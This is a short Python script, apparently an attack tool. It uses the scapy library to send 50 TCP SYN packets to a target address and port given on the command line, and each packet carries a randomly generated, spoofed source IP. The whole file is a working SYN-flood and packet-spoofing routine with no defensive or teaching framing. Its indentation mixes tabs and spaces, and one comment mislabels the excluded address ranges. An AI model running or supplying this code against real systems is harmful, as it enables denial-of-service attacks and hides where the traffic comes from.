#!/usr/bin/env python

from scapy.all import *
from random import randrange
import sys
import ipaddr

not_valid = [10,127,169,172,192]

for x in range(0,50):

        #generate random numbers between 1 and 256, but not RFC1918
        first = randrange(1,256)
        while first in not_valid:
                first = randrange(1,256)

        #join each string by a . (thus creating a random IP)
        sip = ".".join([str(first),str(randrange(1,256)),
        str(randrange(1,256)),str(randrange(1,256))])

	print sip ," > ", sys.argv[1], ":" ,sys.argv[2]
        p=IP(dst=sys.argv[1],src=sip)/TCP(dport=int(sys.argv[2]),sport=RandShort(),flags="S")

	send(p, verbose=0)

        #print summarys
        #ans.summary()
        #unans.summary()
